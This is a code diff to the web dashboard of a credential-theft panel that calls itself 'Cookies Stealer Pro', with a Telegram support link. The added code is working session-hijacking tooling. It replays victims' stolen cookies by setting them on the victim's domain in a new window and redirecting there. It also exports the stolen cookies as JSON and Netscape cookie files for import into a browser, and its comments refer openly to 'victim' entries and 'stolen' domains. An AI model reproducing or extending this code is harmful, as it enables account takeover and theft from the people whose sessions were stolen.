@@ -100,6 +100,8 @@
             overflow-y: auto;
             transition: transform 0.3s ease;
             z-index: 100;
+            display: flex;
+            flex-direction: column;
         }
         .sidebar .logo { padding: 0 6px 18px 6px; border-bottom: 1px solid #1a2538; margin-bottom: 18px; }
         .sidebar .logo .brand { font-size: 16px; font-weight: 800; color: #00ff88; display: flex; align-items: center; gap: 8px; }
@@ -127,11 +129,10 @@
         .sidebar .nav-divider { border-top: 1px solid #1a2538; margin: 12px 6px; }
         .sidebar .nav-label { font-size: 9px; color: #334155; text-transform: uppercase; letter-spacing: 1px; padding: 6px 12px; }
         .sidebar .version { font-size: 9px; color: #1e293b; text-align: center; margin-top: 16px; padding-top: 12px; border-top: 1px solid #1a2538; }
-        .sidebar .version span { color: #00ff88; }
 
-        /* ===== CONTACT SUPPORT BUTTON (Sidebar) ===== */
+        /* ===== CONTACT SUPPORT BUTTON (Sidebar Bottom) ===== */
         .sidebar .contact-support {
-            margin-top: 6px;
+            margin-top: auto;
             padding: 6px 12px;
             border-radius: 8px;
             background: linear-gradient(135deg, #1a2a3a, #0f1626);
@@ -145,6 +146,7 @@
             gap: 8px;
             font-weight: 500;
             text-decoration: none;
+            margin-bottom: 8px;
         }
         .sidebar .contact-support:hover {
             background: linear-gradient(135deg, #1a3a5a, #162030);
@@ -974,13 +976,6 @@
             <div class="sub">Cookies <span>Stealer</span> Pro</div>
         </div>
 
-        <!-- ===== CONTACT SUPPORT (Sidebar Top) ===== -->
-        <a href="https://t.me/nullrouterot13" target="_blank" class="contact-support" title="Contact Support on Telegram">
-            <span class="icon">✉️</span> Contact Support
-        </a>
-
-        <div style="height:4px;"></div>
-
         <div class="nav-item active" data-view="main" id="navMain">
             <span class="icon">📊</span> Dashboard
         </div>
@@ -1019,6 +1014,12 @@
         </div>
 
         <div class="nav-divider"></div>
+
+        <!-- ===== CONTACT SUPPORT (Sidebar Bottom) ===== -->
+        <a href="https://t.me/nullrouterot13" target="_blank" class="contact-support" title="Contact Support on Telegram">
+            <span class="icon">✉️</span> Contact Support
+        </a>
+
         <div class="version">
             <span>●</span> v2.0 · Secure <span>●</span>
         </div>
@@ -2040,13 +2041,88 @@
         }
 
         // ============================================================
-        // SESSION TESTER — FIXED
+        // SESSION REPLAY — FIXED (uses actual stolen domain, not railway)
+        // ============================================================
+
+        function replaySession(domain) {
+            let cookies = {};
+            let actualDomain = domain;
+            
+            // Find the actual victim entry with this domain
+            allData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                    Object.assign(cookies, entry.cookies || {});
+                    actualDomain = entryDomain;
+                }
+            });
+
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No cookies found for ' + domain, 'error');
+                return;
+            }
+
+            // If the domain is our own railway domain, try to find a better one
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                for (const entry of allData) {
+                    const ed = entry.fingerprint?.hostname || entry.domain || '';
+                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
+                        actualDomain = ed;
+                        cookies = {};
+                        Object.assign(cookies, entry.cookies || {});
+                        break;
+                    }
+                }
+            }
+
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No valid domain found to replay', 'error');
+                return;
+            }
+
+            const win = window.open('', '_blank');
+            if (!win) {
+                showToast('⚠️ Popup blocked. Allow popups.', 'error');
+                return;
+            }
+
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+
+            win.document.write(`
+                <!DOCTYPE html>
+                <html><head><title>Loading ${cleanDomain}...</title>
+                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
+                <div class="s"></div>
+                <p>Replaying session for <strong>${cleanDomain}</strong>...</p>
+                <p style="font-size:11px;color:#475569;">${Object.keys(cookies).length} cookies</p>
+                <script>
+                    const cookies = ${JSON.stringify(cookies)};
+                    let count = 0;
+                    Object.entries(cookies).forEach(([name, value]) => {
+                        try { 
+                            document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; 
+                            count++; 
+                        } catch(e) {}
+                    });
+                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
+                <\/script>
+            </body></html>
+            `);
+            win.document.close();
+            showToast('▶️ Replay started for ' + cleanDomain, 'success');
+        }
+
+        function replayFromModal() {
+            if (currentModalDomain) replaySession(currentModalDomain);
+        }
+
+        // ============================================================
+        // SESSION TESTER — FIXED (uses actual stolen domain)
         // ============================================================
 
         async function testSession(domain) {
             let cookies = {};
             let actualDomain = domain;
-            let found = false;
             
             // Find the actual victim entry
             allData.forEach(entry => {
@@ -2054,7 +2130,6 @@
                 if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
                     Object.assign(cookies, entry.cookies || {});
                     actualDomain = entryDomain;
-                    found = true;
                 }
             });
 
@@ -2065,7 +2140,6 @@
                     if (ed && ed === domain) {
                         Object.assign(cookies, entry.cookies || {});
                         actualDomain = ed;
-                        found = true;
                         break;
                     }
                 }
@@ -2078,7 +2152,6 @@
                     if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
                         Object.assign(cookies, entry.cookies || {});
                         actualDomain = ed;
-                        found = true;
                         break;
                     }
                 }
@@ -2196,7 +2269,23 @@
         }
 
         // ============================================================
-        // EXPORT VIEW
+        // TEST FROM MODAL
+        // ============================================================
+
+        function testFromModal() {
+            if (currentModalDomain) {
+                const btn = document.querySelector('.modal .session-actions .test');
+                if (btn) {
+                    btn.textContent = '⏳';
+                    btn.style.opacity = '0.6';
+                    btn.disabled = true;
+                }
+                testSession(currentModalDomain);
+            }
+        }
+
+        // ============================================================
+        // EXPORT FUNCTIONS
         // ============================================================
 
         function exportCSV() {
@@ -2240,6 +2329,44 @@
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
             showToast('📥 Raw JSON exported', 'success');
+        }
+
+        function downloadJSON() {
+            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
+            const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 JSON exported', 'success');
+        }
+
+        function downloadNetscape() {
+            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
+            let lines = ['# Netscape HTTP Cookie File', '# Generated by Cipher Anon Cookies Stealer Pro', ''];
+            allData.forEach(entry => {
+                const cookies = entry.cookies || {};
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const cleanDomain = domain.startsWith('.') ? domain : '.' + domain;
+                Object.entries(cookies).forEach(([name, value]) => {
+                    const expiry = Math.floor(Date.now() / 1000) + 31536000;
+                    lines.push(`${cleanDomain}\tTRUE\t/\tFALSE\t${expiry}\t${name}\t${value}`);
+                });
+            });
+            const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${new Date().toISOString().slice(0,10)}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 Netscape exported', 'success');
         }
 
         // ============================================================
@@ -2567,6 +2694,57 @@
         }
 
         // ============================================================
+        // COPY & DOWNLOAD
+        // ============================================================
+
+        function copyCookie(value) {
+            navigator.clipboard.writeText(value).then(() => {
+                showToast('✅ Cookie copied!', 'success');
+            });
+        }
+
+        function downloadCookie(name, value) {
+            const data = { name: name, value: value, exportedAt: new Date().toISOString() };
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookie_${name}_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`📥 Cookie "${name}" downloaded`, 'success');
+        }
+
+        function downloadDomain(domain) {
+            let cookies = {};
+            allData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                    Object.assign(cookies, entry.cookies || {});
+                }
+            });
+
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No cookies found', 'error');
+                return;
+            }
+
+            const data = { domain: domain, cookies: cookies, exportedAt: new Date().toISOString() };
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${domain}_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`📥 Downloaded ${Object.keys(cookies).length} cookies for ${domain}`, 'success');
+        }
+
+        // ============================================================
         // PASSWORD CHANGE
         // ============================================================
 
@@ -2686,193 +2864,6 @@
             } catch (e) {
                 showToast('❌ Failed to update', 'error');
             }
-        }
-
-        // ============================================================
-        // COPY & DOWNLOAD
-        // ============================================================
-
-        function copyCookie(value) {
-            navigator.clipboard.writeText(value).then(() => {
-                showToast('✅ Cookie copied!', 'success');
-            });
-        }
-
-        function downloadCookie(name, value) {
-            const data = { name: name, value: value, exportedAt: new Date().toISOString() };
-            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `cookie_${name}_${new Date().toISOString().slice(0,10)}.json`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast(`📥 Cookie "${name}" downloaded`, 'success');
-        }
-
-        function downloadDomain(domain) {
-            let cookies = {};
-            allData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
-                    Object.assign(cookies, entry.cookies || {});
-                }
-            });
-
-            if (Object.keys(cookies).length === 0) {
-                showToast('❌ No cookies found', 'error');
-                return;
-            }
-
-            const data = { domain: domain, cookies: cookies, exportedAt: new Date().toISOString() };
-            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `cookies_${domain}_${new Date().toISOString().slice(0,10)}.json`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast(`📥 Downloaded ${Object.keys(cookies).length} cookies for ${domain}`, 'success');
-        }
-
-        // ============================================================
-        // SESSION REPLAY — FIXED
-        // ============================================================
-
-        function replaySession(domain) {
-            let cookies = {};
-            let actualDomain = domain;
-            let found = false;
-            
-            // Find the actual victim entry with this domain
-            allData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
-                    Object.assign(cookies, entry.cookies || {});
-                    actualDomain = entryDomain;
-                    found = true;
-                }
-            });
-
-            if (Object.keys(cookies).length === 0) {
-                showToast('❌ No cookies found for ' + domain, 'error');
-                return;
-            }
-
-            // If the domain is our own railway domain, try to find a better one
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                for (const entry of allData) {
-                    const ed = entry.fingerprint?.hostname || entry.domain || '';
-                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
-                        actualDomain = ed;
-                        cookies = {};
-                        Object.assign(cookies, entry.cookies || {});
-                        break;
-                    }
-                }
-            }
-
-            if (Object.keys(cookies).length === 0) {
-                showToast('❌ No valid domain found to replay', 'error');
-                return;
-            }
-
-            const win = window.open('', '_blank');
-            if (!win) {
-                showToast('⚠️ Popup blocked. Allow popups.', 'error');
-                return;
-            }
-
-            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
-
-            win.document.write(`
-                <!DOCTYPE html>
-                <html><head><title>Loading ${cleanDomain}...</title>
-                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
-                <div class="s"></div>
-                <p>Replaying session for <strong>${cleanDomain}</strong>...</p>
-                <p style="font-size:11px;color:#475569;">${Object.keys(cookies).length} cookies</p>
-                <script>
-                    const cookies = ${JSON.stringify(cookies)};
-                    let count = 0;
-                    Object.entries(cookies).forEach(([name, value]) => {
-                        try { 
-                            document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; 
-                            count++; 
-                        } catch(e) {}
-                    });
-                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
-                <\/script>
-            </body></html>
-            `);
-            win.document.close();
-            showToast('▶️ Replay started for ' + cleanDomain, 'success');
-        }
-
-        function replayFromModal() {
-            if (currentModalDomain) replaySession(currentModalDomain);
-        }
-
-        // ============================================================
-        // TEST FROM MODAL
-        // ============================================================
-
-        function testFromModal() {
-            if (currentModalDomain) {
-                const btn = document.querySelector('.modal .session-actions .test');
-                if (btn) {
-                    btn.textContent = '⏳';
-                    btn.style.opacity = '0.6';
-                    btn.disabled = true;
-                }
-                testSession(currentModalDomain);
-            }
-        }
-
-        // ============================================================
-        // EXPORT FUNCTIONS
-        // ============================================================
-
-        function downloadJSON() {
-            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
-            const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `cookies_${new Date().toISOString().slice(0,10)}.json`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast('📥 JSON exported', 'success');
-        }
-
-        function downloadNetscape() {
-            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
-            let lines = ['# Netscape HTTP Cookie File', '# Generated by Cipher Anon Cookies Stealer Pro', ''];
-            allData.forEach(entry => {
-                const cookies = entry.cookies || {};
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                const cleanDomain = domain.startsWith('.') ? domain : '.' + domain;
-                Object.entries(cookies).forEach(([name, value]) => {
-                    const expiry = Math.floor(Date.now() / 1000) + 31536000;
-                    lines.push(`${cleanDomain}\tTRUE\t/\tFALSE\t${expiry}\t${name}\t${value}`);
-                });
-            });
-            const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `cookies_${new Date().toISOString().slice(0,10)}.txt`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast('📥 Netscape exported', 'success');
         }
 
         // ============================================================
